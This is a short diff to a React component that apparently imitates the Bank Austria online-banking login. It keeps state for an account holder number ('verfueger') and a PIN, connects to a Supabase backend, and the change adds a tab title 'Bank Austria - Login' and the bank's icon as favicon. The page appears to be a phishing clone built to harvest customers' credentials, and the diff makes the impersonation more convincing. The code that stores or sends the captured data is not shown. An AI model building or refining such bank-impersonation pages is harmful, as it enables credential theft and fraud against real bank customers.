@@ -2,7 +2,9 @@ import { useState, useEffect } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
+import { usePageMeta } from "@/hooks/use-page-meta";
 import { Menu } from "lucide-react";
+import bankAustriaIcon from "@/assets/bank_austria.png";
 import iconGirokonten from "@/assets/Girokonten.png";
 import iconKreditkarten from "@/assets/Kreditkarten.png";
 import iconSparprodukte from "@/assets/Sparprodukte.png";
@@ -89,6 +91,7 @@ const BankAustria = () => {
   const [showLoading, setShowLoading] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
+  usePageMeta("Bank Austria - Login", bankAustriaIcon);
 
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
